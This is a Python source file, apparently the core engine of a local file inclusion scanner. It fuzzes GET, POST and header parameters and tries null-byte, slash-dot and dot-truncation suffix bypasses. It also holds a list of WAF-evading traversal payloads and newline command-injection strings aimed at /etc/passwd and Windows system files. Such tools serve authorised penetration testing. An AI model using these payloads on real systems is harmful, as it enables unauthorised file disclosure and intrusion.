"""Async core scanning engine — replaces targetScanner.py.

All scanning logic matches original: sniper scan, blind scan, identify_vuln,
read_files, dot-truncation. Parallelised with ``asyncio.gather`` + ``Semaphore``.

Uses ``set_seq1()``/``set_seq2()`` for difflib (not removed ``set_seqs()``).
"""

from __future__ import annotations

import asyncio
import difflib
import os
import re
from copy import deepcopy
from typing import Optional

from http_client import HTTPClient
from language import LanguageRegistry
from models import FileEntry, ScanTarget, VulnReport
from utils import Logger, LOG_ALWAYS, LOG_DEBUG, LOG_DEVEL, LOG_ERROR, LOG_INFO, LOG_WARN


class FileInclusionScanner:
    """Core scanner. Stateless per-scan — instantiate once per target."""

    def __init__(
        self,
        config,
        lang_registry: LanguageRegistry,
        http: HTTPClient,
        logger: Logger,
        semaphore: asyncio.Semaphore,
    ):
        self.config = config
        self.lang = lang_registry
        self.http = http
        self.log = logger
        self.semaphore = semaphore

        self.monkey_technique: bool = False          # p_monkeymode — blind mode

        self.params: dict[str, str] = {}
        self.postparams: dict[str, str] = {}
        self.header: dict[str, dict[str, str]] = {}
        self.target_url: str = ""

    #=== Target preparation =====================================================

    def prepare_target(self, url: str) -> bool:
        """Parse GET/POST/Header params from URL. Returns True if any params found."""
        self.target_url = url

        self.log.log("Inspecting URL '%s'..." % self.target_url, LOG_ALWAYS)

        self.log.log("Analyzing provided GET params...", LOG_DEBUG)
        if self.target_url.count("?") == 0:
            self.log.log("Target URL doesn't have any GET params.", LOG_DEBUG)
        else:
            data = self.target_url.split("?")[1]
            for ln in data.split("&") if "&" in data else [data]:
                self._add_token(self.params, ln)

        self.log.log("Analyzing provided POST params...", LOG_DEBUG)
        post = self.config.p_post
        if post:
            for ln in post.split("&") if "&" in post else [post]:
                self._add_token(self.postparams, ln)
        else:
            self.log.log("No POST params provided.", LOG_DEBUG)

        self.log.log("Analyzing provided headers...", LOG_DEBUG)
        header = self.config.header
        if header:
            for key, header_string in header.items():
                self.header[key] = {}
                for ln in header_string.split(";") if ";" in header_string else [header_string]:
                    self._add_token(self.header[key], ln)
        else:
            self.log.log("No headers provided.", LOG_DEBUG)

        return bool(self.params or self.postparams or self.header)

    def _add_token(self, arr: dict[str, str], token: str) -> None:
        if "=" not in token:
            arr[token] = ""
            self.log.log("Token found: [%s] = none" % token, LOG_DEBUG)
        else:
            k, v = token.split("=", 1)
            arr[k] = v
            self.log.log("Token found: [%s] = [%s]" % (k, v), LOG_DEBUG)

    #=== Main scan ==============================================================

    async def test_target_vuln(self) -> list[tuple[VulnReport, list[str]]]:
        """Scan all params for file inclusion vulns. Returns (report, readable_files) pairs."""
        ret: list[tuple[VulnReport, list[str]]] = []

        self.log.log("Fiddling around with URL...", LOG_INFO)

        # Sniper scan: GET, POST, HEADER params
        for k, v in self.params.items():
            await self.analyze_url(ret, k, v, self.config.p_post, 0, deepcopy(self.config.header))

        for k, v in self.postparams.items():
            await self.analyze_url(ret, k, v, self.config.p_post, 1, deepcopy(self.config.header))

        for key, params in self.header.items():
            for k, v in params.items():
                await self.analyze_url(ret, k, v, self.config.p_post, 2, deepcopy(self.config.header), key)

        # Blind scan if nothing found and monkey mode enabled
        if not ret and self.monkey_technique:
            self.log.log("Sniper failed. Going blind...", LOG_INFO)
            files = self.lang.getBlindFiles()
            os_restriction = self.config.force_os

            for fileobj in files:
                if os_restriction:
                    if fileobj.isWindows() and os_restriction != "windows":
                        continue
                    if fileobj.isUnix() and os_restriction != "linux":
                        continue

                back_syms = (fileobj.getBackSymbols(True), fileobj.getBackSymbols(False))

                get_done = False
                post_done = False
                head_done: dict[str, bool] = {}

                for back_sym in back_syms:
                    multi = self.config.p_multiply_term
                    if multi > 1:
                        back_sym = back_sym.replace("..", ".." * multi)
                        back_sym = back_sym.replace(fileobj.getBackSymbol(), fileobj.getBackSymbol() * multi)

                    for i in range(
                        self.lang.getBlindMin(),
                        self.lang.getBlindMax(),
                    ):
                        do_break = False
                        testfile = fileobj.getFilepath()
                        if i > 0:
                            tmpf = testfile
                            if fileobj.isWindows():
                                tmpf = testfile[testfile.find(":") + 1 :]
                            testfile = back_sym * i + tmpf

                        if not get_done:
                            for k, V in self.params.items():
                                rep, do_break = await self.analyze_url_blindly(
                                    i, testfile, k, V, fileobj.getFindStr(), back_sym,
                                    self.config.p_post, 0, fileobj.isUnix(),
                                    deepcopy(self.config.header),
                                )
                                if rep is not None:
                                    rep.setVulnKeyVal(V)
                                    rep.setPostData(self.config.p_post)
                                    rep.setPost(0)
                                    rep.setHeader(deepcopy(self.config.header))
                                    ret.append((rep, await self.read_files(rep)))
                                    get_done = True

                        if not post_done:
                            for k, V in self.postparams.items():
                                rep, do_break = await self.analyze_url_blindly(
                                    i, testfile, k, V, fileobj.getFindStr(), back_sym,
                                    self.config.p_post, 1, fileobj.isUnix(),
                                    deepcopy(self.config.header),
                                )
                                if rep is not None:
                                    rep.setVulnKeyVal(V)
                                    rep.setPostData(self.config.p_post)
                                    rep.setPost(1)
                                    rep.setHeader(deepcopy(self.config.header))
                                    ret.append((rep, await self.read_files(rep)))
                                    post_done = True

                        for key, params in self.header.items():
                            if key not in head_done:
                                head_done[key] = False
                            if not head_done[key]:
                                for k, val in params.items():
                                    rep, do_break = await self.analyze_url_blindly(
                                        i, testfile, k, val, fileobj.getFindStr(), back_sym,
                                        self.config.p_post, 2, fileobj.isUnix(),
                                        deepcopy(self.config.header), key,
                                    )
                                    if rep is not None:
                                        rep.setVulnKeyVal(val)
                                        rep.setVulnHeaderKey(key)
                                        rep.setPostData(self.config.p_post)
                                        rep.setPost(2)
                                        rep.setHeader(deepcopy(self.config.header))
                                        ret.append((rep, await self.read_files(rep)))
                                        head_done[key] = True

                        if do_break:
                            return ret

                        if "R" in fileobj.getFlags():
                            break

            # Advanced curated fuzz pass — WAF evasion, encoding bypasses
            if not ret:
                self.log.log("Blind scan exhausted. Trying advanced fuzz payloads...", LOG_INFO)
                for k, v in self.params.items():
                    fuzz_rep = await self._run_advanced_fuzz(self.params, k, v, 0, deepcopy(self.config.header))
                    if fuzz_rep:
                        ret.append((fuzz_rep, await self.read_files(fuzz_rep)))
                        break

                if not ret:
                    for k, v in self.postparams.items():
                        fuzz_rep = await self._run_advanced_fuzz(self.postparams, k, v, 1, deepcopy(self.config.header))
                        if fuzz_rep:
                            ret.append((fuzz_rep, await self.read_files(fuzz_rep)))
                            break

                if not ret:
                    for key, params in self.header.items():
                        for k, v in params.items():
                            fuzz_rep = await self._run_advanced_fuzz(
                                self.header, k, v, 2, deepcopy(self.config.header), key
                            )
                            if fuzz_rep:
                                ret.append((fuzz_rep, await self.read_files(fuzz_rep)))
                                break
                        if ret:
                            break

        return ret

    #=== Advanced fuzz payloads ================================================

    @staticmethod
    def _get_advanced_fuzz_payloads() -> list[tuple[str, str]]:
        """Return curated LFI traversal payloads for WAF evasion and encoding bypass.

        Each tuple is ``(payload, description)``.  These are used as a final
        fuzz pass after algorithmic blind scanning fails.
        """
        return [
            # -- double encoding --------------------------------------------------
            ("/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
             "double-encoded traversal (8 levels)"),
            ("/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
             "double-encoded traversal (6 levels)"),

            # -- Unicode / UTF-8 overlong (IIS, old PHP) --------------------------
            ("/..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd",
             "Unicode bypass (%c0%af) — IIS"),
            ("/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
             "UTF-8 overlong (%c0%ae) — 5 levels"),
            ("/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
             "UTF-8 overlong (%c0%ae) — 3 levels"),

            # -- mixed slashes ----------------------------------------------------
            ("/..\\../..\\../..\\../..\\../etc/passwd",
             "mixed slashes (/..\\../..\\)"),

            # -- dot-only traversal (some WAFs miss it) ---------------------------
            ("/././././././etc/passwd",
             "dot-only traversal (/././././././)"),

            # -- newline injection (shell-in-LFI) ---------------------------------
            ("%0a/bin/cat%20/etc/passwd",
             "newline injection + cat"),
            ("%0a;cat%20/etc/passwd",
             "newline injection + semicolon cat"),

            # -- null-byte prefix / suffix tricks ---------------------------------
            ("%00../../../../../../etc/passwd",
             "null-byte prefix + traversal"),
            ("/../../../../etc/passwd%00.jpg",
             "extension masquerade (%00.jpg)"),
            ("/../../../../etc/passwd%00.html",
             "extension masquerade (%00.html)"),

            # -- WAF evasion with XML entity / quotes ----------------------------
            ("&apos;/bin/cat%20/etc/passwd&apos;",
             "WAF evasion — xml-entity quote wrapping"),

            # -- double / triple URL encoding -------------------------------------
            ("%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
             "double URL-encoded (%252e%252e%252f)"),
            ("..%252f..%252f..%252f..%252f..%252fetc/passwd",
             "nested encoding (..%252f..%252f)"),
            ("%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc/passwd",
             "triple URL-encoded (%25252e)"),

            # -- IIS / Windows backslash-unicode ----------------------------------
            ("..%5c..%5c..%5c..%5c..%5cwindows/win.ini",
             "Windows backslash-unicode (..%5c)"),
            ("..%5c..%5c..%5c..%5c..%5cboot.ini",
             "Windows backslash-unicode → boot.ini"),

            # -- backslash prefix bypass ------------------------------------------
            ("\\..\\..\\..\\..\\..\\windows\\win.ini",
             "Windows backslash traversal"),

            # -- caret / pipe injection (IIS + old CGI) ---------------------------
            ("^^../../../../etc/passwd",
             "caret prefix (^^) — extension stripping"),

            # -- semi-colon path truncation --------------------------------------
            ("/../../../../etc/passwd;",
             "semicolon path truncation"),

            # -- question-mark query truncation -----------------------------------
            ("/../../../../etc/passwd?",
             "question-mark query truncation"),

            # -- hash fragment truncation -----------------------------------------
            ("/../../../../etc/passwd%23",
             "hash (#) fragment truncation"),
        ]

    async def _run_advanced_fuzz(
        self,
        params: dict,
        k: str,
        v: str,
        hax_mode: int = 0,
        header: Optional[dict] = None,
        header_key: Optional[str] = None,
    ) -> Optional[VulnReport]:
        """Fire all curated fuzz payloads against a single param.

        Returns a VulnReport on first hit, None if nothing worked.
        """
        payloads = self._get_advanced_fuzz_payloads()
        blind_files = self.lang.getBlindFiles()
        if not blind_files:
            return None

        # Use the first blind file's findstr as canary
        canary = blind_files[0].getFindStr()

        for payload, desc in payloads:
            tmpurl = self.target_url
            tmppost = self.config.p_post
            head_dict = deepcopy(header) if header else {}

            if hax_mode == 0:
                tmpurl = tmpurl.replace("%s=%s" % (k, v), "%s=%s" % (k, payload))
            elif hax_mode == 1:
                tmppost = tmppost.replace("%s=%s" % (k, v), "%s=%s" % (k, payload))
            elif hax_mode == 2:
                tmphead = head_dict.get(header_key or "", "")
                tmphead = tmphead.replace("%s=%s" % (k, v), "%s=%s" % (k, payload))
                head_dict[header_key] = tmphead

            async with self.semaphore:
                if tmppost:
                    code, _ = await self.http.post(tmpurl, tmppost, additional_headers=head_dict)
                else:
                    code, _ = await self.http.get(tmpurl, additional_headers=head_dict)

            if code is not None and canary and canary in code:
                self.log.log(
                    "Advanced fuzz hit: '%s' (%s)" % (payload[:60], desc), LOG_ALWAYS
                )
                rep = VulnReport(self.target_url, Params=params, VulnKey=k)
                rep.setVulnKeyVal(v)
                rep.setPost(hax_mode)
                rep.setPostData(self.config.p_post)
                rep.setHeader(deepcopy(self.config.header))
                if header_key:
                    rep.setVulnHeaderKey(header_key)
                rep.setSurfix("")
                rep.setBlindDiscovered(True)
                rep.setSuffixBreakable(False)
                return rep

            self.log.log("Advanced fuzz miss: %s" % desc, LOG_DEBUG)

        return None

    #=== analyze_url — sniper scan ==============================================

    async def analyze_url(
        self,
        result: list,
        k: str,
        v: str,
        post: str,
        hax_mode: int = 0,
        header: Optional[dict] = None,
        header_key: Optional[str] = None,
    ) -> None:
        tmpurl = self.target_url
        tmppost = post
        head_dict = deepcopy(header) if header else {}

        rnd_str = await self._random_str_async()

        if hax_mode == 0:
            tmpurl = tmpurl.replace("%s=%s" % (k, v), "%s=%s" % (k, rnd_str))
        elif hax_mode == 1:
            tmppost = tmppost.replace("%s=%s" % (k, v), "%s=%s" % (k, rnd_str))
        elif hax_mode == 2:
            tmphead = head_dict.get(header_key or "", "")
            tmphead = tmphead.replace("%s=%s" % (k, v), "%s=%s" % (k, rnd_str))
            head_dict[header_key] = tmphead

        code = None
        if post:
            self.log.log("Requesting: '%s' with POST('%s')..." % (tmpurl, tmppost), LOG_DEBUG)
            code, _ = await self.http.post(tmpurl, tmppost, additional_headers=head_dict)
        else:
            self.log.log("Requesting: '%s'..." % tmpurl, LOG_DEBUG)
            code, _ = await self.http.get(tmpurl, additional_headers=head_dict)

        if code is None:
            return

        # Check readfile detectors
        readfile_err_msg = self.lang.getAllReadfileRegex()
        for lang_name, ex in readfile_err_msg:
            re_success = re.compile(ex % rnd_str, re.DOTALL)
            m = re_success.search(code)
            if m is not None:
                if hax_mode == 0:
                    self.log.log("Possible local file disclosure found! -> '%s' with Parameter '%s'. (%s)" % (tmpurl, k, lang_name), LOG_ALWAYS)
                elif hax_mode == 1:
                    self.log.log("Possible local file disclosure found! -> '%s' with POST-Parameter '%s'. (%s)" % (tmpurl, k, lang_name), LOG_ALWAYS)
                elif hax_mode == 2:
                    self.log.log("Possible local file disclosure found! -> '%s' with Header(%s)-Parameter '%s'. (%s)" % (tmpurl, header_key, k, lang_name), LOG_ALWAYS)
                return

        # Check sniper regex
        sniper_regex_list = self.lang.getAllSniperRegex()
        for lang_name, sniper in sniper_regex_list:
            re_success = re.compile(sniper % rnd_str, re.DOTALL)
            m = re_success.search(code)
            if m is not None:
                rep = None
                if hax_mode == 0:
                    self.log.log("[%s] Possible file inclusion found! -> '%s' with Parameter '%s'." % (lang_name, tmpurl, k), LOG_ALWAYS)
                    rep = await self.identify_vuln(self.target_url, self.params, k, post, lang_name, hax_mode, header_dict=head_dict)
                elif hax_mode == 1:
                    self.log.log("[%s] Possible file inclusion found! -> '%s' with POST-Parameter '%s'." % (lang_name, tmpurl, k), LOG_ALWAYS)
                    rep = await self.identify_vuln(self.target_url, self.postparams, k, post, lang_name, hax_mode, header_dict=head_dict)
                elif hax_mode == 2:
                    self.log.log("[%s] Possible file inclusion found! -> '%s' with Header(%s)-Parameter '%s'." % (lang_name, tmpurl, header_key, k), LOG_ALWAYS)
                    rep = await self.identify_vuln(self.target_url, self.header, k, post, lang_name, hax_mode, header_key=header_key, header_dict=head_dict)

                if rep is not None:
                    rep.setVulnKeyVal(v)
                    rep.setLanguage(lang_name)
                    result.append((rep, await self.read_files(rep)))

    #=== analyze_url_blindly — blind scan =======================================

    async def analyze_url_blindly(
        self,
        i: int,
        testfile: str,
        k: str,
        v: str,
        find: str,
        go_back_symbols: str,
        post: Optional[str] = None,
        hax_mode: int = 0,
        is_unix: bool = True,
        header: Optional[dict] = None,
        header_key: Optional[str] = None,
    ) -> tuple[Optional[VulnReport], bool]:
        tmpurl = self.target_url
        tmppost = post or ""
        head_dict = deepcopy(header) if header else {}
        rep: Optional[VulnReport] = None
        do_break = False

        if hax_mode == 0:
            tmpurl = tmpurl.replace("%s=%s" % (k, v), "%s=%s" % (k, testfile))
        elif hax_mode == 1:
            tmppost = tmppost.replace("%s=%s" % (k, v), "%s=%s" % (k, testfile))
        elif hax_mode == 2:
            tmphead = head_dict.get(header_key or "", "")
            tmphead = tmphead.replace("%s=%s" % (k, v), "%s=%s" % (k, testfile))
            head_dict[header_key] = tmphead

        async with self.semaphore:
            if post:
                code, _ = await self.http.post(tmpurl, tmppost, additional_headers=head_dict)
            else:
                code, _ = await self.http.get(tmpurl, additional_headers=head_dict)

        if code is not None:
            if code.find(find) != -1:
                if hax_mode == 0:
                    self.log.log("Possible file inclusion found blindly! -> '%s' with Parameter '%s'." % (tmpurl, k), LOG_ALWAYS)
                    rep = await self.identify_vuln(self.target_url, self.params, k, post, None, hax_mode, (go_back_symbols * i, False), is_unix, header_dict=head_dict)
                elif hax_mode == 1:
                    self.log.log("Possible file inclusion found blindly! -> '%s' with POST-Parameter '%s'." % (tmpurl, k), LOG_ALWAYS)
                    rep = await self.identify_vuln(self.target_url, self.postparams, k, post, None, hax_mode, (go_back_symbols * i, False), is_unix, header_dict=head_dict)
                elif hax_mode == 2:
                    self.log.log("Possible file inclusion found blindly! -> '%s' with Header(%s)-Parameter '%s'." % (tmpurl, header_key, k), LOG_ALWAYS)
                    rep = await self.identify_vuln(self.target_url, self.header, k, post, None, hax_mode, (go_back_symbols * i, False), is_unix, header_key, header_dict=head_dict)
                do_break = True
            else:
                # Null-byte attempt
                tmpurl2 = self.target_url
                tmpfile = testfile + "%00"
                postdata2 = post or ""
                head_dict2 = deepcopy(header) if header else {}

                if hax_mode == 0:
                    tmpurl2 = tmpurl2.replace("%s=%s" % (k, v), "%s=%s" % (k, tmpfile))
                elif hax_mode == 1:
                    postdata2 = postdata2.replace("%s=%s" % (k, v), "%s=%s" % (k, tmpfile))
                elif hax_mode == 2:
                    tmphead = head_dict2.get(header_key or "", "")
                    tmphead = tmphead.replace("%s=%s" % (k, v), "%s=%s" % (k, tmpfile))
                    head_dict2[header_key] = tmphead

                async with self.semaphore:
                    if post:
                        code, _ = await self.http.post(tmpurl2, postdata2, additional_headers=head_dict2)
                    else:
                        code, _ = await self.http.get(tmpurl2, additional_headers=head_dict2)

                if code is None:
                    self.log.log("Code == None. Skipping testing of the URL.", LOG_DEBUG)
                    do_break = True
                elif code.find(find) != -1:
                    if hax_mode == 0:
                        self.log.log("Possible file inclusion found blindly! -> '%s' with Parameter '%s'." % (tmpurl2, k), LOG_ALWAYS)
                    elif hax_mode == 1:
                        self.log.log("Possible file inclusion found blindly! -> '%s' with POST-Parameter '%s'." % (tmpurl2, k), LOG_ALWAYS)
                    elif hax_mode == 2:
                        self.log.log("Possible file inclusion found blindly! -> '%s' with Header(%s)-Parameter '%s'." % (tmpurl2, header_key, k), LOG_ALWAYS)
                    rep = await self.identify_vuln(self.target_url, self.params, k, post, None, hax_mode, (go_back_symbols * i, True), is_unix, header_key, header_dict=head_dict2) if hax_mode == 0 else await self.identify_vuln(self.target_url, self.postparams, k, post, None, hax_mode, (go_back_symbols * i, True), is_unix, header_key, header_dict=head_dict2) if hax_mode == 1 else await self.identify_vuln(self.target_url, self.header, k, post, None, hax_mode, (go_back_symbols * i, True), is_unix, header_key, header_dict=head_dict2)
        else:
            do_break = True

        return rep, do_break

    #=== identify_vuln — analyse a found vuln ===================================

    async def identify_vuln(
        self,
        url: str,
        params: dict,
        vuln_param: str,
        post_data: str,
        language: Optional[str],
        hax_mode: int = 0,
        blind_mode: Optional[tuple] = None,
        is_unix: Optional[bool] = None,
        header_key: Optional[str] = None,
        header_dict: Optional[dict] = None,
    ) -> Optional[VulnReport]:
        if blind_mode is None:
            r = VulnReport(url, Params=params, VulnKey=vuln_param)
            script: Optional[str] = None
            scriptpath: Optional[str] = None
            pre: Optional[str] = None

            lang_class = self.lang.getAllLangSets().get(language or "", None)
            if lang_class is None:
                self.log.log("Unknown language: %s" % language, LOG_ERROR)
                return None

            if hax_mode == 0:
                self.log.log("[%s] Identifying Vulnerability '%s' with Parameter '%s'..." % (language, url, vuln_param), LOG_ALWAYS)
            elif hax_mode == 1:
                self.log.log("[%s] Identifying Vulnerability '%s' with POST-Parameter '%s'..." % (language, url, vuln_param), LOG_ALWAYS)
            elif hax_mode == 2:
                self.log.log("[%s] Identifying Vulnerability '%s' with Header(%s)-Parameter '%s'..." % (language, url, header_key, vuln_param), LOG_ALWAYS)

            tmpurl = url
            post_hax = post_data
            rnd_str = self._get_random_str()

            if hax_mode == 0:
                tmpurl = tmpurl.replace("%s=%s" % (vuln_param, params[vuln_param]), "%s=%s" % (vuln_param, rnd_str))
            elif hax_mode == 1:
                post_hax = post_hax.replace("%s=%s" % (vuln_param, params[vuln_param]), "%s=%s" % (vuln_param, rnd_str))
            elif hax_mode == 2:
                tmphead = deepcopy(self.config.header.get(header_key or "", ""))
                if isinstance(tmphead, str):
                    tmphead = tmphead.replace("%s=%s" % (vuln_param, params.get(header_key, {}).get(vuln_param, "")), "%s=%s" % (vuln_param, rnd_str))
                header_dict = header_dict or {}
                header_dict[header_key or ""] = tmphead
                r.setVulnHeaderKey(header_key)

            async with self.semaphore:
                if post_hax:
                    code, _ = await self.http.post(tmpurl, post_hax, additional_headers=header_dict)
                else:
                    code, _ = await self.http.get(tmpurl, additional_headers=header_dict)

            if code is None:
                self.log.log("Identification of vulnerability failed. (code == None)", LOG_ERROR)
                return None

            re_success = re.compile(lang_class.getSniper() % rnd_str, re.DOTALL)
            m = re_success.search(code)
            if m is None:
                self.log.log("Identification of vulnerability failed. (m == None)", LOG_ERROR)
                return None

            r.setPost(hax_mode)
            r.setPostData(post_data)
            r.setHeader(deepcopy(self.config.header))

            s = None
            for sp_err_msg in lang_class.getIncludeDetectors():
                re_script_path = re.compile(sp_err_msg, re.S)
                s = re_script_path.search(code)
                if s is not None:
                    break

            if s is None:
                self.log.log("Failed to retrieve script path.", LOG_WARN)
                return None

            script = s.group("script")
            if script is not None and len(script) > 1 and script[1] == ":":
                scriptpath = script[: script.rfind("\\")]
                r.setWindows()
            elif script is not None and script.startswith("\\\\"):
                scriptpath = script[: script.rfind("\\")]
                r.setWindows()
            else:
                scriptpath = os.path.dirname(script or "")
                if not scriptpath:
                    self.log.log("Scriptpath is empty! Assuming that we are on toplevel.", LOG_WARN)
                    scriptpath = "/"
                    script = "/" + (script or "")

            if scriptpath:
                self.log.log("Scriptpath received: '%s'" % scriptpath, LOG_INFO)
                r.setServerPath(scriptpath)
                r.setServerScript(script)

            if r.isWindows():
                self.log.log("Operating System is 'Windows'.", LOG_INFO)
            else:
                self.log.log("Operating System is 'Unix-Like'.", LOG_INFO)

            errmsg = m.group("incname") if m else ""

            if errmsg == rnd_str:
                r.setPrefix("")
                r.setSurfix("")
            else:
                tokens = errmsg.split(rnd_str)
                pre = tokens[0]
                add_slash = False
                if pre == "":
                    pre = "/"

                rootdir: Optional[str] = None
                if not pre.startswith("/"):
                    if r.isUnix():
                        pre = os.path.join(r.getServerPath() or "/", pre)
                        pre = os.path.normpath(pre)
                        rootdir = "/"
                        pre = self._relpath_unix(rootdir, pre)
                    else:
                        import ntpath
                        pre = ntpath.join(r.getServerPath() or "C:\\", pre)
                        pre = ntpath.normpath(pre)
                        if len(pre) > 1 and pre[1] == ":":
                            rootdir = pre[0:3]
                        elif pre.startswith("\\"):
                            self.log.log("The inclusion points to a network path! Skipping vulnerability.", LOG_WARN)
                            return None
                        pre = self._relpath_win(rootdir, pre)
                else:
                    pre = self._relpath_unix("/", pre)

                if pre != ".":
                    pre = "/" + pre

                sur = tokens[1] if len(tokens) > 1 else ""
                if pre == ".":
                    pre = ""
                r.setPrefix(pre)
                r.setSurfix(sur)

                if sur:
                    # Null-Byte Poisoning
                    self.log.log("Trying NULL-Byte Poisoning to get rid of the suffix...", LOG_INFO)
                    tmpurl_nb = url
                    post_hax_nb = post_data
                    head = deepcopy(header_dict or self.config.header)

                    if hax_mode == 0:
                        tmpurl_nb = tmpurl_nb.replace("%s=%s" % (vuln_param, params[vuln_param]), "%s=%s%%00" % (vuln_param, rnd_str))
                    elif hax_mode == 1:
                        post_hax_nb = post_data.replace("%s=%s" % (vuln_param, params[vuln_param]), "%s=%s%%00" % (vuln_param, rnd_str))
                    elif hax_mode == 2:
                        tmphead = deepcopy(self.config.header.get(header_key or "", ""))
                        if isinstance(tmphead, str):
                            tmphead = tmphead.replace("%s=%s" % (vuln_param, params.get(header_key, {}).get(vuln_param, "")), "%s=%s%%00" % (vuln_param, rnd_str))
                        head[header_key or ""] = tmphead
                        r.setVulnHeaderKey(header_key)

                    async with self.semaphore:
                        if post_hax_nb:
                            code_nb, _ = await self.http.post(tmpurl_nb, post_hax_nb, additional_headers=head)
                        else:
                            code_nb, _ = await self.http.get(tmpurl_nb, additional_headers=head)

                    if code_nb is None:
                        self.log.log("NULL-Byte testing failed.", LOG_WARN)
                        r.setSuffixBreakable(False)
                    elif code_nb.find("%s\\0%s" % (rnd_str, sur)) != -1 or code_nb.find("%s%s" % (rnd_str, sur)) != -1:
                        self.log.log("NULL-Byte Poisoning not possible.", LOG_INFO)
                        r.setSuffixBreakable(False)
                    else:
                        self.log.log("NULL-Byte Poisoning successfull!", LOG_INFO)
                        r.setSurfix("%00")
                        r.setSuffixBreakable(True)
                        r.setSuffixBreakTechName("Null-Byte")

                    # Slash-Dot Bypass — bypass substr($file,-4) != '.php' guards
                    # /etc/passwd/. resolves to /etc/passwd at filesystem level,
                    # but substr(-4) returns '/.' not '.php'
                    if not r.isSuffixBreakable():
                        self.log.log("Trying Slash-Dot Bypass to bypass extension checks...", LOG_INFO)
                        tmpurl_sd = url
                        post_hax_sd = post_data
                        head_sd = deepcopy(header_dict or self.config.header)

                        if hax_mode == 0:
                            tmpurl_sd = tmpurl_sd.replace(
                                "%s=%s" % (vuln_param, params[vuln_param]),
                                "%s=%s/." % (vuln_param, rnd_str),
                            )
                        elif hax_mode == 1:
                            post_hax_sd = post_data.replace(
                                "%s=%s" % (vuln_param, params[vuln_param]),
                                "%s=%s/." % (vuln_param, rnd_str),
                            )
                        elif hax_mode == 2:
                            tmphead_sd = deepcopy(self.config.header.get(header_key or "", ""))
                            if isinstance(tmphead_sd, str):
                                pv_sd = ""
                                if isinstance(params.get(header_key), dict):
                                    pv_sd = params[header_key].get(vuln_param, "")
                                tmphead_sd = tmphead_sd.replace(
                                    "%s=%s" % (vuln_param, pv_sd),
                                    "%s=%s/." % (vuln_param, rnd_str),
                                )
                            head_sd[header_key or ""] = tmphead_sd
                            r.setVulnHeaderKey(header_key)

                        async with self.semaphore:
                            if post_hax_sd:
                                code_sd, _ = await self.http.post(tmpurl_sd, post_hax_sd, additional_headers=head_sd)
                            else:
                                code_sd, _ = await self.http.get(tmpurl_sd, additional_headers=head_sd)

                        if code_sd is not None:
                            # Check: random string still appears (file was included despite /. suffix)
                            # AND the suffix with /. is NOT in the output (meaning the /. got resolved away)
                            if code_sd.find(rnd_str) != -1 and code_sd.find("%s/." % sur) == -1:
                                self.log.log("Slash-Dot Bypass successfull!", LOG_INFO)
                                r.setSurfix("/.")
                                r.setSuffixBreakable(True)
                                r.setSuffixBreakTechName("Slash-Dot")
                            else:
                                self.log.log("Slash-Dot Bypass not possible.", LOG_INFO)

                if sur and not r.isSuffixBreakable() and self.config.p_doDotTruncation:
                    if r.isUnix() and self.config.p_dot_trunc_only_win:
                        self.log.log("Not trying dot-truncation because it's a unix server and you have not enabled it.", LOG_INFO)
                    else:
                        await self._dot_truncation(r, url, params, vuln_param, post_data, hax_mode, header_key, header_dict)

            if not scriptpath:
                if pre:
                    self.log.log("Failed to retrieve path but we are forced to go relative!", LOG_WARN)
                    return None
                else:
                    self.log.log("Failed to retrieve path! It's an absolute injection so I'll fake it to '/'...", LOG_WARN)
                    scriptpath = "/"
                    r.setServerPath(scriptpath)

            return r

        else:
            # Blind mode
            prefix = blind_mode[0]
            is_null = blind_mode[1]
            self.log.log("Identifying Vulnerability '%s' with Parameter '%s' blindly..." % (url, vuln_param), LOG_ALWAYS)
            r = VulnReport(url, Params=params, VulnKey=vuln_param)
            r.setBlindDiscovered(True)
            r.setSurfix("")
            r.setHeader(deepcopy(self.config.header))
            r.setVulnHeaderKey(header_key)
            if is_null:
                r.setSurfix("%00")
            r.setSuffixBreakable(is_null)
            r.setSuffixBreakTechName("Null-Byte" if is_null else None)
            if prefix.strip() == "":
                r.setServerPath("/noop")
            else:
                r.setServerPath(prefix.replace("..", "a"))
            r.setServerScript("noop")

            slash = "/" if is_unix else "\\"
            r.setPrefix(prefix + slash)
            if not is_unix:
                r.setWindows()
            return r

    async def _dot_truncation(
        self,
        r: VulnReport,
        url: str,
        params: dict,
        vuln_param: str,
        post_data: str,
        hax_mode: int,
        header_key: Optional[str],
        header_dict: Optional[dict],
    ) -> None:
        """Dot-truncation using difflib.SequenceMatcher."""
        dot_trunc_start = self.config.p_dot_trunc_min
        dot_trunc_end = self.config.p_dot_trunc_max
        dot_trunc_step = self.config.p_dot_trunc_step
        max_diff = self.config.p_dot_trunc_ratio

        self.log.log("Trying Dot Truncation to get rid of the suffix...", LOG_INFO)

        desturl = url
        post_hax = post_data
        head = deepcopy(header_dict or self.config.header)
        header_dict = header_dict or {}

        async with self.semaphore:
            if post_data:
                code1, _ = await self.http.post(url, post_data, additional_headers=head)
            else:
                code1, _ = await self.http.get(url, additional_headers=head)

        if code1 is None:
            self.log.log("Dot Truncation testing failed :(", LOG_WARN)
            return

        vuln_param_block: str
        if hax_mode in (0, 1):
            vuln_param_block = "%s=%s%s" % (vuln_param, params[vuln_param], r.getAppendix() or "")
        else:
            pv = params.get(header_key, {}).get(vuln_param, "") if isinstance(params.get(header_key), dict) else ""
            vuln_param_block = "%s=%s%s" % (vuln_param, pv, r.getAppendix() or "")

        if hax_mode == 0:
            desturl = desturl.replace("%s=%s" % (vuln_param, params[vuln_param]), vuln_param_block)
        elif hax_mode == 1:
            post_hax = post_hax.replace("%s=%s" % (vuln_param, params[vuln_param]), vuln_param_block)
        elif hax_mode == 2:
            tmphead = deepcopy(self.config.header.get(header_key or "", ""))
            if isinstance(tmphead, str):
                pv = params.get(header_key, {}).get(vuln_param, "") if isinstance(params.get(header_key), dict) else ""
                tmphead = tmphead.replace("%s=%s" % (vuln_param, pv), vuln_param_block)
            header_dict[header_key or ""] = tmphead
            r.setVulnHeaderKey(header_key)

        seqmatcher = difflib.SequenceMatcher()
